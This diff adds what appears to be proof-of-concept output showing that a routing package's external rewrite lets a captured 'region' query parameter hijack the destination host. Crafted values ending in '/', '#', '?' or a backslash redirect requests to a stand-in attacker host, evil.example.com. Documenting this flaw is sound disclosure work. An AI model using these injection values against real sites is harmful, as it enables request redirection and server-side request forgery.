@@ -1,0 +1,16 @@
+@next/routing@16.3.4 (published dist)
+destination: https://$region.api.example.com/data
+capture: has query param `region` = (?<region>.+)
+
+  region="us-east"                externalRewrite=https://us-east.api.example.com/data
+                          RESOLVED HOST -> us-east.api.example.com
+  region="evil.example.com/"      externalRewrite=https://evil.example.com/.api.example.com/data
+                          RESOLVED HOST -> evil.example.com
+  region="evil.example.com#"      externalRewrite=https://evil.example.com/#.api.example.com/data
+                          RESOLVED HOST -> evil.example.com
+  region="evil.example.com?"      externalRewrite=https://evil.example.com/?.api.example.com/data
+                          RESOLVED HOST -> evil.example.com
+  region="evil.example.com\\"     externalRewrite=https://evil.example.com/.api.example.com/data
+                          RESOLVED HOST -> evil.example.com
+  region="x@evil.example.com"     externalRewrite=https://x@evil.example.com.api.example.com/data
+                          RESOLVED HOST -> evil.example.com.api.example.com
